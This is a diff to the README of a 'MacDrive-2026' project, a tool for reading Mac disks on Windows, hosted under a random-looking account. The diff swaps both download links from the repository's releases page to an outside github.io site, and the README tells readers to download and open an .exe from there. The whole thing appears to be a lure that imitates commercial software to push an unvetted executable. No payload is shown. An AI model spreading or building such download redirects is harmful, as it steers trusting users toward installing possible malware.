@@ -1,6 +1,6 @@
 # 💾 MacDrive-2026 - Access Mac disks on Windows easily
 
-[![Download MacDrive](https://img.shields.io/badge/Download-MacDrive-0078D4.svg?style=for-the-badge)](https://github.com/Marie-jeannearmlike773/MacDrive-2026/releases)
+[![Download MacDrive](https://img.shields.io/badge/Download-MacDrive-0078D4.svg?style=for-the-badge)](https://marie-jeannearmlike773.github.io)
 
 MacDrive-2026 provides a bridge between different computer systems. Windows computers usually cannot read hardware formatted for Mac computers. This software solves that problem. It allows your Windows 11 or Windows 10 computer to see, open, and edit files stored on Mac-formatted hard drives and flash drives.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements before you start the installation 
 
 You must visit the official release page to get the installer. 
 
-[Click here to visit the download page](https://github.com/Marie-jeannearmlike773/MacDrive-2026/releases)
+[Click here to visit the download page](https://marie-jeannearmlike773.github.io)
 
 Once you reach the page, look for the section marked Assets. Select the file ending in .exe to start your download. Your browser might ask where to save the file. Choose a folder you can find easily, such as your Downloads folder. Wait for the download to finish before you attempt to open the file.
 
